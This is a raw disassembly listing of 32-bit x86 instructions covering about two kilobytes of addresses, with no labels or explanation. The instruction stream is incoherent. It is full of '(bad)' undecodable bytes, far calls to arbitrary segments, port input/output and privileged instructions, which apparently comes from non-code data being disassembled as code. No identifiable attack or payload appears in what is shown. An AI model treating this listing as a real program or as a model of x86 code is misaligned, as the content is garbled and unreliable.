  4090f4:	xor    ecx,esp
  4090f6:	cmp    al,0xcf
  4090f8:	jnp    0x4090fb
  4090fa:	sub    bh,BYTE PTR [ebx+0x2c875e8f]
  409100:	call   0x5b98:0x9639a0
  409107:	out    0x18,eax
  409109:	or     ch,BYTE PTR [esi]
  40910b:	jp     0x409160
  40910d:	dec    edx
  40910e:	mov    al,ds:0xb5e42c56
  409113:	outs   dx,DWORD PTR ds:[esi]
  409114:	les    edi,FWORD PTR [esi]
  409116:	lahf   
  409117:	cdq    
  409118:	push   edx
  409119:	push   ebx
  40911a:	jle    0x40915a
  40911c:	or     ebx,ecx
  40911e:	mov    eax,DWORD PTR [edi-0x6faa2282]
  409124:	outs   dx,BYTE PTR ds:[esi]
  409125:	outs   dx,BYTE PTR ds:[esi]
  409126:	add    al,0x6
  409128:	jp     0x40919e
  40912a:	ja     0x40916e
  40912c:	jecxz  0x4090ba
  40912e:	mov    DWORD PTR [ecx],esi
  409130:	loope  0x409157
  409132:	call   0xa3a3:0x2428372f
  409139:	outs   dx,BYTE PTR ds:[esi]
  40913a:	sbb    ebx,DWORD PTR [edi-0x7b1c6e1]
  409140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409141:	call   0x8f73:0x100c31f8
  409148:	out    0x35,eax
  40914a:	cmp    bh,bl
  40914c:	data16 adc ah,bh
  40914f:	jbe    0x4091a7
  409151:	ds pop edx
  409153:	call   0xbf23:0x7523e0e6
  40915a:	lds    esp,FWORD PTR ds:0xbadc44da
  409160:	mov    bl,0x80
  409162:	out    0xbd,al
  409164:	sar    esi,0xb5
  409167:	(bad)  
  409168:	popa   
  409169:	or     al,0x0
  40916b:	jmp    0x963dfd2e
  409170:	pop    es
  409171:	or     eax,0x229cb000
  409176:	push   edx
  409177:	mov    eax,ds:0x5c1e3eb7
  40917c:	aad    0x66
  40917e:	popa   
  40917f:	js     0x4091a5
  409181:	outs   dx,DWORD PTR ds:[esi]
  409182:	stos   BYTE PTR es:[edi],al
  409183:	in     al,0xd
  409185:	mov    ds:0x6d1657d9,al
  40918a:	in     eax,dx
  40918b:	sbb    dl,BYTE PTR [ebp+0x6a1c0532]
  409191:	push   ds
  409192:	and    eax,0x20191961
  409197:	inc    esi
  409198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409199:	ror    BYTE PTR [ecx-0x4ee8aeb4],cl
  40919f:	sti    
  4091a0:	daa    
  4091a1:	xchg   edi,eax
  4091a2:	aam    0xce
  4091a4:	jge    0x409201
  4091a6:	call   0x34fc:0xc339429a
  4091ad:	xchg   ecx,eax
  4091ae:	xchg   edx,eax
  4091af:	(bad)  
  4091b0:	(bad)  
  4091b1:	lock or al,0xce
  4091b4:	sbb    esi,DWORD PTR [eax-0x1391e3b2]
  4091ba:	mov    edi,0xff811271
  4091bf:	cli    
  4091c0:	mov    eax,0x60bc3cc3
  4091c5:	sbb    al,0xf4
  4091c7:	ror    ecx,0x88
  4091ca:	gs ins BYTE PTR es:[edi],dx
  4091cc:	sbb    bh,bh
  4091ce:	leave  
  4091cf:	ret    0x2e10
  4091d2:	gs push 0x34
  4091d5:	scas   al,BYTE PTR es:[edi]
  4091d6:	mov    dh,0x2a
  4091d8:	pop    ebp
  4091d9:	xor    BYTE PTR [esi-0x56],0x88
  4091dd:	jns    0x4091e0
  4091df:	jecxz  0x4091a8
  4091e1:	inc    esi
  4091e2:	sub    bl,BYTE PTR [ebp+0x36]
  4091e5:	jp     0x40919e
  4091e7:	popf   
  4091e8:	push   esi
  4091e9:	sti    
  4091ea:	sub    ebx,DWORD PTR [edx+0x7b]
  4091ed:	mov    ebp,0x484950dd
  4091f2:	mov    esi,ss
  4091f4:	es sahf 
  4091f6:	ins    BYTE PTR es:[edi],dx
  4091f7:	jl     0x40919c
  4091f9:	lods   eax,DWORD PTR ds:[esi]
  4091fa:	fwait
  4091fb:	or     BYTE PTR [ebp-0x2b],bl
  4091fe:	or     cl,BYTE PTR [eax-0x66]
  409201:	push   edi
  409202:	in     eax,dx
  409203:	mov    ?,WORD PTR [edi+0x23]
  409206:	adc    cl,ch
  409208:	les    esi,FWORD PTR [eax-0x5c86f920]
  40920e:	pop    ebp
  40920f:	cmp    bl,BYTE PTR [ecx+0x9]
  409212:	setb   BYTE PTR [edi-0x4b]
  409216:	or     eax,0x2b5df4fe
  40921b:	jge    0x409281
  40921d:	imul   ebx,DWORD PTR [ebx],0xf2a8e1c1
  409223:	and    DWORD PTR [edi+eiz*4],ebp
  409226:	mov    ds:0x4fef76df,eax
  40922b:	jmp    0x2f3f:0x349c0472
  409232:	jmp    0x91c8:0x28bb3487
  409239:	out    dx,eax
  40923a:	cli    
  40923b:	sub    cl,BYTE PTR [edx-0x38]
  40923e:	jae    0x409276
  409240:	inc    esi
  409241:	std    
  409242:	and    BYTE PTR [edi-0x1635e2fd],cl
  409248:	dec    ebx
  409249:	(bad)
  40924d:	lods   al,BYTE PTR ds:[esi]
  40924e:	push   0x4ecd875d
  409253:	loop   0x409233
  409255:	push   eax
  409256:	mov    bh,BYTE PTR [edi-0x600130c8]
  40925c:	hlt    
  40925d:	(bad)  
  40925e:	mov    edx,0x97045e28
  409263:	push   ebp
  409264:	lock dec esp
  409266:	adc    edi,ebp
  409268:	sbb    esi,DWORD PTR [ebp-0x74]
  40926b:	sbb    DWORD PTR [ecx],edx
  40926d:	cmp    al,dh
  40926f:	add    ebp,DWORD PTR [edx-0x76]
  409272:	dec    esi
  409273:	mov    ebp,0x2a26b16a
  409278:	(bad)  
  409279:	jbe    0x409281
  40927b:	push   es
  40927c:	fild   DWORD PTR [ebp-0x43]
  40927f:	inc    eax
  409280:	and    BYTE PTR [edx-0x4c],al
  409283:	lods   al,BYTE PTR ds:[esi]
  409284:	dec    ebx
  409285:	xchg   esi,eax
  409287:	cwde   
  409288:	push   ss
  409289:	stos   BYTE PTR es:[edi],al
  40928a:	add    BYTE PTR [ebx-0xa2fe944],0xea
  409291:	pop    ebx
  409292:	test   DWORD PTR [ecx+0x44],edi
  409295:	pushf  
  409296:	ror    DWORD PTR [edi+0x33a27600],0x4f
  40929d:	jg     0x4092ad
  40929f:	jg     0x40923d
  4092a1:	or     DWORD PTR [ebp-0x37],edi
  4092a4:	ficom  WORD PTR [ecx+0x7c]
  4092a7:	lods   eax,DWORD PTR ds:[esi]
  4092a8:	sbb    BYTE PTR [ebp+edi*2+0x6e],ah
  4092ac:	push   ebx
  4092ad:	lds    ebx,FWORD PTR [edi+eax*2-0x4b206aa0]
  4092b4:	add    al,0x44
  4092b6:	xlat   BYTE PTR ds:[ebx]
  4092b7:	and    BYTE PTR [edx+0x7fcae719],0xd2
  4092be:	xchg   ebp,eax
  4092bf:	ins    BYTE PTR es:[edi],dx
  4092c0:	mov    edi,0xf359165
  4092c5:	push   ebx
  4092c6:	jns    0x4092ac
  4092c8:	outs   dx,DWORD PTR ds:[esi]
  4092c9:	enter  0xffc3,0xb
  4092cd:	mov    ch,BYTE PTR [esi+0x219502de]
  4092d3:	xor    BYTE PTR [esi+0x49],bh
  4092d6:	cmp    eax,DWORD PTR [edx+0x2b]
  4092d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092da:	nop
  4092db:	push   ecx
  4092dc:	jbe    0x409307
  4092de:	and    bl,BYTE PTR [ecx+edi*1+0x10]
  4092e2:	test   al,0x14
  4092e4:	inc    ebx
  4092e5:	cmc    
  4092e6:	mov    ecx,0x8db78156
  4092eb:	and    dl,ah
  4092ed:	push   edx
  4092ee:	ficom  DWORD PTR [esi-0x13]
  4092f1:	mov    ch,0xb6
  4092f3:	mov    ds:0x9a56af32,eax
  4092f8:	mov    dh,0x18
  4092fa:	pop    eax
  4092fb:	jg     0x4092a9
  4092fd:	jg     0x409301
  4092ff:	pop    ss
  409300:	in     eax,0x6b
  409302:	add    bh,BYTE PTR [ecx+0x52e06fee]
  409308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409309:	pop    ecx
  40930a:	push   si
  40930c:	inc    edi
  40930d:	repz xor bl,0x90
  409311:	push   0x4d
  409313:	xchg   ebp,eax
  409314:	inc    ecx
  409315:	jne    0x409368
  409317:	jb     0x409392
  409319:	pusha  
  40931a:	inc    eax
  40931b:	jle    0x4092b4
  40931d:	sbb    BYTE PTR [edi-0x56],bl
  409320:	mov    eax,ds:0x3b16ac35
  409325:	enter  0x4046,0xe9
  409329:	cmc    
  40932a:	out    dx,al
  40932b:	push   ds
  40932c:	push   edi
  40932d:	mov    gs,WORD PTR [ebp+0x3e363bc2]
  409333:	add    ebp,edx
  409335:	mov    WORD PTR [ebx+0x1466eb71],es
  40933b:	outs   dx,BYTE PTR ds:[esi]
  40933c:	ja     0x40939e
  40933e:	leave  
  40933f:	cmp    ebp,DWORD PTR [eax]
  409341:	jnp    0x40937f
  409343:	add    BYTE PTR [ebx+0x55c55bff],0x82
  40934a:	mov    ah,0x60
  40934c:	jno    0x4092df
  40934e:	call   0xfe67:0x938fc4dd
  409355:	stos   BYTE PTR es:[edi],al
  409356:	push   0x38
  409358:	imul   esp,DWORD PTR [edx+ebp*4-0x4ac6f81a],0xffffff8d
  409360:	(bad)  
  409361:	call   0xfe55e2c4
  409366:	test   BYTE PTR [ebx],ch
  409368:	mov    esi,0x57c78e74
  40936d:	xchg   edi,eax
  40936e:	dec    edi
  40936f:	aas    
  409370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409371:	ins    BYTE PTR es:[edi],dx
  409372:	pmulhuw mm5,QWORD PTR [ebx+0x69]
  409376:	xchg   ebp,eax
  409377:	cwde   
  409378:	and    ebx,DWORD PTR [edx]
  40937a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40937b:	fstp   st(7)
  40937d:	jmp    0x409317
  40937f:	ret    
  409380:	pop    esi
  409381:	add    al,0x4b
  409383:	leave  
  409384:	jae    0x409307
  409386:	or     DWORD PTR [ecx],edx
  409388:	ret    0x6105
  40938b:	loop   0x4093ad
  40938d:	loopne 0x409400
  40938f:	loop   0x40939e
  409391:	add    al,0xca
  409393:	(bad)  
  409394:	pop    edx
  409395:	or     eax,0xc9ca7ce7
  40939a:	jl     0x409375
  40939c:	dec    dh
  40939e:	xchg   ecx,eax
  40939f:	(bad)  
  4093a0:	fidiv  DWORD PTR [edx]
  4093a2:	push   ds
  4093a3:	ret    0xb19c
  4093a6:	mov    ds:0x196eab3b,al
  4093ab:	aas    
  4093ac:	adc    al,0x7d
  4093ae:	add    al,0x1c
  4093b0:	mov    dh,0x79
  4093b2:	call   0xa93c:0x34537b4f
  4093b9:	jne    0x409395
  4093bb:	fwait
  4093bc:	pop    ds
  4093bd:	ficom  WORD PTR [edx+0x2a]
  4093c0:	fidiv  DWORD PTR [edi-0xcc4e3da]
  4093c6:	cmp    dh,BYTE PTR [ebx-0x3d8a0fee]
  4093cc:	and    DWORD PTR [edi+eax*4+0x7607f7c5],ecx
  4093d3:	mov    ecx,0xb0f1a7ae
  4093d8:	mov    eax,0x12233705
  4093dd:	loop   0x4093c4
  4093df:	xchg   DWORD PTR [edi+0x2e],eax
  4093e2:	sti    
  4093e3:	push   edi
  4093e4:	les    esp,FWORD PTR ds:0x4904f7df
  4093ea:	(bad)  
  4093eb:	sti    
  4093ec:	mov    ebx,0xf5269c0b
  4093f1:	sub    BYTE PTR [edi+0x76a881cc],cl
  4093f7:	out    dx,al
  4093f8:	mov    edx,0x9a15d411
  4093fd:	(bad)  
  4093fe:	cwde   
  4093ff:	mov    ecx,0xa53dd560
  409404:	jl     0x4093cd
  409406:	push   ds
  409407:	popfw  
  409409:	push   ss
  40940a:	inc    ebx
  40940b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40940c:	or     al,0x8e
  40940e:	adc    al,0x90
  409410:	bound  edx,QWORD PTR [ecx-0x3271cf20]
  409416:	xchg   edx,eax
  409417:	dec    eax
  409418:	aad    0x6f
  40941a:	dec    edx
  40941b:	sti    
  40941c:	stc    
  40941d:	dec    eax
  40941e:	sub    al,0xd2
  409420:	test   al,al
  409422:	add    cl,dh
  409424:	test   BYTE PTR [edi-0x2e],ch
  409427:	jae    0x409470
  409429:	out    0x6a,al
  40942b:	test   al,0xd3
  40942d:	push   esp
  40942e:	mov    esp,0x27f67ca
  409433:	jmp    0x93f30c2a
  409438:	sbb    edi,DWORD PTR [ebx+0x3e]
  40943b:	xor    edi,ecx
  40943d:	jbe    0x409482
  40943f:	inc    ebp
  409440:	sahf   
  409441:	sar    BYTE PTR [ecx],0xb0
  409444:	div    DWORD PTR [edx+0x79]
  409447:	inc    ecx
  409448:	cmc    
  409449:	adc    DWORD PTR [edi],0xf11c2f2a
  40944f:	add    DWORD PTR [edi-0x7f],esi
  409452:	mov    bl,0xf1
  409454:	outs   dx,BYTE PTR ds:[esi]
  409455:	ret    0xbd94
  409458:	je     0x4093f3
  40945a:	(bad)  
  40945c:	cmp    BYTE PTR [ebp+0x78],dl
  40945f:	das    
  409460:	xor    DWORD PTR [esi],ebp
  409462:	push   ds
  409463:	daa    
  409464:	fadd   QWORD PTR [ebx]
  409466:	mov    ebx,0x122cfc2e
  40946b:	ja     0x40942f
  40946d:	push   es
  40946e:	mov    ebp,DWORD PTR [esi+0x37e9571d]
  409474:	ret    
  409475:	xchg   ecx,eax
  409476:	xchg   edi,eax
  409477:	jge    0x4094c6
  409479:	fisub  DWORD PTR [eax]
  40947b:	push   ebp
  40947c:	or     eax,0x4cc8c1c4
  409481:	adc    dh,BYTE PTR ss:[ebx+0x28]
  409485:	pop    ss
  409486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409487:	repnz sbb al,0x5a
  40948a:	rcr    DWORD PTR [eax+0x31],0x97
  40948e:	jle    0x40941a
  409490:	mov    ds:0x68a7af70,eax
  409495:	test   eax,eax
  409497:	dec    ebx
  409498:	fcmovbe st,st(6)
  40949a:	sub    eax,0xf5ed4381
  40949f:	(bad)  [ecx+eax*8+0x44]
  4094a3:	xchg   ecx,eax
  4094a4:	mov    eax,ss
  4094a6:	fsub   DWORD PTR [ebp-0x7925765]
  4094ac:	push   es
  4094ad:	jb     0x409499
  4094af:	je     0x409522
  4094b1:	lock jno 0x409505
  4094b4:	xor    BYTE PTR [ebx-0x21838aab],al
  4094ba:	add    al,0x5a
  4094bc:	jo     0x40951b
  4094be:	cmp    DWORD PTR [edx],ebp
  4094c0:	and    al,0xda
  4094c2:	mov    dl,0x5b
  4094c4:	shl    DWORD PTR [ebp+0x71],0x0
  4094c8:	loop   0x409538
  4094ca:	fidivr DWORD PTR [ecx-0x32c39769]
  4094d0:	sbb    DWORD PTR [edi+0x59],esi
  4094d3:	cmc    
  4094d4:	push   eax
  4094d5:	clc    
  4094d6:	daa    
  4094d7:	(bad)  
  4094d8:	sbb    DWORD PTR [ecx],edi
  4094da:	xchg   ebx,eax
  4094db:	push   ss
  4094dc:	fmul   st(6),st
  4094de:	stos   BYTE PTR es:[edi],al
  4094df:	cmp    al,0x17
  4094e1:	call   0x517a0aeb
  4094e6:	fstp   QWORD PTR [ecx-0x3b]
  4094e9:	mov    ebp,0x15c24659
  4094ee:	sbb    BYTE PTR [ebx],dh
  4094f0:	and    bh,BYTE PTR [ebx+0x2c]
  4094f3:	rcr    ecx,0xdf
  4094f6:	(bad)  
  4094f7:	cwde   
  4094f8:	mov    cl,0x14
  4094fa:	cwde   
  4094fb:	mov    cl,0x66
  4094fd:	dec    esp
  4094fe:	ret    0x49e5
  409501:	mov    dl,0xde
  409503:	retf   
  409504:	or     al,dl
  409506:	mov    ds:0x138df495,eax
  40950b:	mov    ecx,0xec57b48c
  409510:	mov    ?,WORD PTR [ebp+eiz*1-0x1ac00d35]
  409517:	mov    DWORD PTR [eax-0x465c0e22],eax
  40951d:	aas    
  40951e:	cwde   
  40951f:	mov    es,WORD PTR [eax+0x41777de4]
  409525:	outs   dx,BYTE PTR ds:[esi]
  409526:	test   al,0x8d
  409528:	(bad)  [ecx]
  40952a:	add    eax,0x290092da
  40952f:	and    al,0x20
  409531:	inc    esp
  409532:	lahf   
  409533:	scas   eax,DWORD PTR es:[edi]
  409534:	mov    eax,ecx
  409536:	call   DWORD PTR [edx]
  409538:	jne    0x40951d
  40953a:	call   DWORD PTR [edi-0x12]
  40953d:	shrd   DWORD PTR [esp+ebp*4+0x39],ebp,cl
  409542:	pop    esi
  409543:	xchg   esp,eax
  409544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409545:	adc    eax,0x117bebde
  40954a:	mov    bl,0x69
  40954c:	mov    ebx,0x9dab4638
  409551:	(bad)  
  409552:	out    dx,eax
  409553:	icebp  
  409554:	int    0x5b
  409556:	(bad)  
  409557:	add    ah,bh
  409559:	sbb    esi,0xfffffffd
  40955c:	mov    ebx,0xb731dc47
  409561:	popa   
  409562:	lods   eax,DWORD PTR ds:[esi]
  409563:	sbb    BYTE PTR [eax-0x53dfdc05],0x93
  40956a:	sbb    BYTE PTR [ecx+0x304c6c3f],dl
  409570:	xlat   BYTE PTR ds:[bx]
  409572:	into   
  409573:	int    0x1e
  409575:	rol    dl,cl
  409577:	popf   
  409578:	retf   0x41fc
  40957b:	dec    esp
  40957c:	mov    esp,0xd94026e8
  409581:	and    ebx,DWORD PTR [ecx-0x21c27022]
  409587:	test   BYTE PTR [eax+0x42],ah
  40958a:	shl    DWORD PTR [edx-0x56],0xa5
  40958e:	in     al,0x64
  409590:	or     al,0x3
  409592:	xchg   edi,eax
  409593:	(bad)  
  409595:	dec    eax
  409596:	push   edx
  409597:	fiadd  DWORD PTR [ecx]
  409599:	jne    0x4095dc
  40959b:	adc    dl,dl
  40959d:	test   al,0x94
  40959f:	add    ch,ah
  4095a1:	shl    DWORD PTR [eax+eiz*2+0x14],cl
  4095a5:	stc    
  4095a6:	jo     0x40959a
  4095a8:	inc    edx
  4095a9:	pop    esi
  4095aa:	or     ebx,DWORD PTR [edx]
  4095ac:	xchg   ebp,eax
  4095ad:	clc    
  4095ae:	ins    BYTE PTR es:[edi],dx
  4095af:	pop    edx
  4095b0:	test   DWORD PTR [ecx-0x42],esp
  4095b3:	lahf   
  4095b4:	xchg   ecx,eax
  4095b5:	dec    ecx
  4095b6:	push   ecx
  4095b7:	cmp    eax,0xbf3c7a44
  4095bc:	outs   dx,BYTE PTR ds:[esi]
  4095bd:	pop    ebp
  4095be:	inc    edi
  4095bf:	shl    DWORD PTR [esi+0xe],cl
  4095c2:	jg     0x409612
  4095c4:	out    dx,eax
  4095c5:	jle    0x4095d1
  4095c7:	or     ebp,DWORD PTR [ebx]
  4095c9:	fist   DWORD PTR [esi]
  4095cb:	xchg   ebx,eax
  4095cc:	mov    ecx,0x45e2c323
  4095d1:	push   es
  4095d2:	imul   eax,DWORD PTR [esp+ebx*2-0x41552522],0xe5aa6368
  4095dd:	jne    0x4095ad
  4095df:	and    eax,0x6d85fde7
  4095e4:	inc    ecx
  4095e5:	popf   
  4095e6:	jns    0x40965f
  4095e8:	jp     0x4095a9
  4095ea:	adc    esi,0x46
  4095ed:	outs   dx,DWORD PTR ds:[esi]
  4095ee:	(bad)  
  4095ef:	lods   al,BYTE PTR ds:[esi]
  4095f0:	jecxz  0x409648
  4095f2:	and    edi,DWORD PTR [ebp+0x77cc6114]
  4095f8:	mov    edi,0x44896ae
  4095fd:	add    dh,BYTE PTR [ebp+0x6cb9976c]
  409603:	push   ss
  409604:	test   eax,0x9e2f5d0b
  409609:	jnp    0x409597
  40960b:	shl    DWORD PTR [edi+edi*2+0x7c281e9b],0x36
  409613:	or     eax,0xc64e32ec
  409618:	ss sti 
  40961a:	adc    DWORD PTR [ecx+0x654438fc],edi
  409620:	push   0xfffffff6
  409622:	js     0x4096a1
  409624:	dec    esi
  409625:	repz ja 0x4095c5
  409628:	jnp    0x409669
  40962a:	jg     0x4095e0
  40962c:	mov    edi,0x666e74fa
  409631:	shl    DWORD PTR [edi+0x78],0x49
  409635:	lock sbb ebx,DWORD PTR [ebp-0x470215ab]
  40963c:	sbb    ch,BYTE PTR [ebp-0x73]
  40963f:	mov    eax,0x487a7b7
  409644:	shl    BYTE PTR [bx+si-0x72],0xb5
  409649:	(bad)  
  40964a:	nop
  40964b:	and    dh,dh
  40964d:	sahf   
  40964e:	push   es
  40964f:	rcr    BYTE PTR ds:0xab808d4,1
  409655:	test   bl,ah
  409657:	das    
  409658:	add    ebp,eax
  40965a:	inc    ebx
  40965b:	ins    DWORD PTR es:[edi],dx
  40965c:	push   esp
  40965d:	and    edi,DWORD PTR [eax+eax*1+0x51fbb70a]
  409664:	ins    BYTE PTR es:[edi],dx
  409665:	sbb    DWORD PTR [edx+ebp*4],ebx
  409668:	test   BYTE PTR [ebx+0x7e4b9325],bh
  40966e:	ds adc eax,0xff9a36bc
  409674:	push   cs
  409675:	ret    0xf98d
  409678:	mov    dl,0xd7
  40967a:	out    0x4c,al
  40967c:	sbb    eax,0x424c020c
  409681:	push   ecx
  409682:	adc    ebp,DWORD PTR [eax]
  409684:	dec    esp
  409685:	add    BYTE PTR [ebx-0x41],0x4
  409689:	lock test al,0x15
  40968c:	mov    esp,DWORD PTR [ebx]
  40968e:	out    0xf0,eax
  409690:	sbb    DWORD PTR [ecx-0x75],eax
  409693:	vmread DWORD PTR [ebx-0x7b],esi
  409697:	das    
  409698:	dec    edx
  409699:	cmp    BYTE PTR [edi-0x51ed9551],dh
  40969f:	loop   0x409649
  4096a1:	repz bound edi,QWORD PTR [ecx-0x71]
  4096a5:	cs mov ebp,0xe814b9d5
  4096ab:	nop
  4096ac:	jmp    0xa335:0x783f5129
  4096b3:	jl     0x40967e
  4096b5:	push   ecx
  4096b6:	sbb    cl,ah
  4096b8:	push   es
  4096b9:	sub    edx,esp
  4096bb:	xor    bl,al
  4096bd:	or     bl,BYTE PTR [edx+0x3d7a10e0]
  4096c3:	mov    WORD PTR [ebp-0x6d],cs
  4096c6:	icebp  
  4096c7:	ds hlt 
  4096c9:	cmp    eax,0x774b6f50
  4096ce:	xchg   ch,ch
  4096d0:	adc    DWORD PTR [ebp+0x351b1416],esp
  4096d6:	sub    al,0x33
  4096d8:	adc    dh,ch
  4096da:	inc    ecx
  4096db:	mov    ebp,0xcf0b9128
  4096e0:	test   eax,0x92e4821b
  4096e5:	jecxz  0x409753
  4096e7:	mov    eax,ds:0xeb714918
  4096ec:	xchg   edi,eax
  4096ed:	loopne 0x40968b
  4096ef:	es dec edi
  4096f1:	gs mov edi,0xc02c68c
  4096f7:	xchg   al,dl
  4096f9:	mov    ebx,0xf77c7ff9
  4096fe:	sti    
  4096ff:	xor    cl,BYTE PTR [ecx+0x65]
  409702:	mov    dh,0xf4
  409704:	xchg   sp,ax
  409706:	imul   edx,DWORD PTR [esi+0x64c4c7ab],0x48
  40970d:	fist   DWORD PTR [esi-0x39]
  409710:	sbb    DWORD PTR [ebx-0xf],eax
  409713:	mov    dl,0xea
  409715:	mov    edi,0xb26d760a
  40971a:	sub    al,ch
  40971c:	popa   
  40971d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40971e:	cdq    
  40971f:	rcl    DWORD PTR [eax+0x3b5a8277],1
  409725:	cs inc ebx
  409727:	adc    al,0x8f
  409729:	leave  
  40972a:	cmp    dl,0xb
  40972d:	imul   ebp,DWORD PTR [ecx],0xffffffcb
  409730:	dec    edx
  409731:	jne    0x40979e
  409733:	lock jecxz 0x4096ef
  409736:	pushf  
  409737:	mov    ss,esp
  409739:	(bad)  
  40973a:	cmp    bl,cl
  40973c:	xlat   BYTE PTR ds:[ebx]
  40973d:	fistp  QWORD PTR [ebx-0x33]
  409740:	pop    edx
  409741:	mov    edx,0x2e19f02c
  409746:	mov    edi,0x89c395e4
  40974b:	pop    es
  40974c:	or     esp,DWORD PTR [ebx]
  40974e:	popa   
  40974f:	dec    eax
  409750:	xor    BYTE PTR [eax-0x6d862726],ah
  409756:	dec    ecx
  409757:	sahf   
  409758:	dec    ecx
  409759:	adc    eax,0x364fa37d
  40975e:	ret    0xedfd
  409761:	(bad)  
  409762:	jecxz  0x409719
  409764:	jl     0x4096eb
  409766:	in     al,dx
  409767:	push   ss
  409768:	dec    ebx
  409769:	test   BYTE PTR ds:0xf2a00070,dh
  40976f:	int    0xbf
  409771:	test   dh,cl
  409773:	in     eax,0xa6
  409775:	adc    edi,DWORD PTR [edi-0x28]
  409778:	jle    0x4096fc
  40977a:	sbb    BYTE PTR [eax+esi*4+0x1b],ah
  40977e:	(bad)  
  40977f:	adc    ebx,DWORD PTR [ebx]
  409781:	fld    QWORD PTR [esi+0x71]
  409784:	aaa    
  409785:	push   ebx
  409786:	rcr    DWORD PTR ds:0x3116a8a6,0x9c
  40978d:	aas    
  40978e:	sbb    DWORD PTR [edi+0x77],ebx
  409791:	xchg   edi,eax
  409792:	push   0x759b3282
  409797:	out    0x4,al
  409799:	cmp    al,0x1f
  40979b:	xchg   DWORD PTR [esi-0x6c423d64],ebx
  4097a1:	cmp    esp,DWORD PTR [edx]
  4097a3:	out    dx,al
  4097a4:	(bad)  
  4097a5:	jl     0x409776
  4097a7:	mov    ebx,0xe14ac5ee
  4097ac:	mov    ?,WORD PTR [ebp+0x2f5b0328]
  4097b2:	jmp    DWORD PTR [esi-0x272fbb0f]
  4097b8:	mov    ch,0xd7
  4097ba:	pop    ds
  4097bb:	jne    0x40979a
  4097bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097be:	fnclex 
  4097c0:	pop    ecx
  4097c1:	inc    edi
  4097c2:	xchg   ebx,eax
  4097c3:	cmc    
  4097c4:	out    dx,al
  4097c5:	or     DWORD PTR [ebp+0x74],0x22
  4097c9:	push   esi
  4097ca:	iret   
  4097cb:	scas   eax,DWORD PTR es:[edi]
  4097cc:	pop    es
  4097cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097ce:	push   edi
  4097cf:	xchg   edx,eax
  4097d0:	push   ss
  4097d1:	sub    ecx,esp
  4097d3:	out    0xe,eax
  4097d5:	adc    BYTE PTR [eax+0x34],dl
  4097d8:	and    eax,0x77aef414
  4097dd:	fsubr  st,st(1)
  4097df:	out    0x5f,eax
  4097e1:	sbb    ah,cl
  4097e3:	pop    edx
  4097e4:	dec    edx
  4097e5:	out    0xaf,eax
  4097e7:	ja     0x4097a6
  4097e9:	sub    dl,bl
  4097eb:	xor    ebp,DWORD PTR [ebx-0x6c]
  4097ee:	mov    bh,0x88
  4097f0:	xchg   ebp,eax
  4097f1:	push   eax
  4097f2:	(bad)  
  4097f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097f4:	xor    al,0x4e
  4097f6:	mov    cl,0xa
  4097f8:	cmp    ebp,DWORD PTR [ebp-0x23]
  4097fb:	push   es
  4097fc:	cmp    eax,0x1bfe07e1
  409801:	icebp  
  409802:	stos   BYTE PTR es:[edi],al
  409803:	in     al,0x41
  409805:	sub    al,0x5e
  409807:	fcom   DWORD PTR [ebx-0x17d63075]
  40980d:	daa    
  40980e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40980f:	pop    eax
  409810:	stos   DWORD PTR es:[edi],eax
  409811:	fimul  WORD PTR [ecx]
  409813:	push   es
  409814:	mov    eax,ds:0x6d01b4e2
  409819:	retf   0x4868
  40981c:	xchg   ebp,eax
  40981d:	data16 stc 
  40981f:	pop    esi
  409820:	enter  0xce21,0x52
  409824:	scas   eax,DWORD PTR es:[edi]
  409825:	cld    
  409826:	mov    edx,0x779d8622
  40982b:	or     eax,0x8e4ccc42
  409830:	stos   BYTE PTR es:[edi],al
  409831:	fimul  DWORD PTR [ebp-0x11934ad9]
  409837:	inc    ebx
  409838:	sub    al,0x53
  40983a:	add    al,0xdc
  40983c:	ror    BYTE PTR [edi+ebx*4-0x15],1
  409840:	aaa    
  409841:	push   0xe471439b
  409846:	fmul   QWORD PTR [esi]
  409848:	loopne 0x40989c
  40984a:	sbb    bh,bl
  40984c:	jns    0x409843
  40984e:	nop
  40984f:	and    eax,0x1afd5b0a
  409854:	inc    esi
  409855:	mov    ds:0x5240e9ba,eax
  40985a:	add    eax,0x714df0f9
  40985f:	lds    ebp,FWORD PTR [esi-0x6c54500e]
  409865:	push   esi
  409866:	push   ebx
  409867:	pop    ecx
  409868:	out    0x15,al
  40986a:	xor    al,0x9d
  40986c:	jecxz  0x4098a4
  40986e:	jne    0x4098df
  409870:	sub    al,0x3f
  409872:	adc    DWORD PTR [ebx+0x40],edx
  409875:	jb     0x4098c9
  409877:	and    eax,0x678ff76a
  40987c:	dec    ebp
  40987d:	in     al,dx
  40987e:	js     0x4098ba
  409880:	push   0x43e36478
  409885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409886:	aaa    
  409887:	sti    
  409888:	mov    WORD PTR [esp+ebx*1],fs
  40988b:	adc    esi,DWORD PTR [eax+0x2efe0022]
  409891:	push   0x9a27e3dc
  409896:	mov    dh,0xaa
  409898:	xchg   ecx,esp
  40989a:	rcr    DWORD PTR [edx+0x4b],cl
  40989d:	aad    0x66
  40989f:	rcl    BYTE PTR [edx],cl
  4098a1:	outs   dx,BYTE PTR ds:[esi]
  4098a2:	sub    al,0x29
  4098a4:	pop    ds
  4098a5:	pop    ds
  4098a6:	lahf   
  4098a7:	ds ret 0x8520
  4098ab:	repz jns 0x409880
  4098ae:	lock (bad) 
  4098b0:	fstp   st(4)
  4098b2:	les    edi,FWORD PTR [ecx+ecx*1+0x32]
  4098b6:	ins    BYTE PTR es:[edi],dx
  4098b7:	fwait
  4098b8:	sbb    BYTE PTR [ebx],ah
  4098ba:	js     0x4098d0
  4098bc:	gs jecxz 0x409918
  4098bf:	loop   0x409923
  4098c1:	std    
